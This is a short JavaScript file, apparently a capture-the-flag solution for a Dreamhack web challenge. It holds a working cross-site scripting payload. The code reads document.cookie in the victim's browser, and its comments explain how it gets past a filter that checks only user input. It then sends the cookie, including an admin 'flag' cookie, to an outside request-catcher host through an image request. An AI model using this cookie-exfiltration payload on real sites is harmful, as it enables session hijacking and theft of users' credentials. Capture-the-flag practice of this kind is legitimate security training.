// x.js
// This runs in the victim's browser context, so we can freely read cookies.
(() => {
    // The filter only blocked .cookie if it appeared in *user input*.
    // This code is never filtered, so we can do:
    const flag = document.cookie; // includes the admin's "flag" cookie.
  
    // Exfiltrate it:
    const i = new Image();
    i.src = "https://irhjmxk.request.dreamhack.games/steal?c=" + encodeURIComponent(flag);
  })();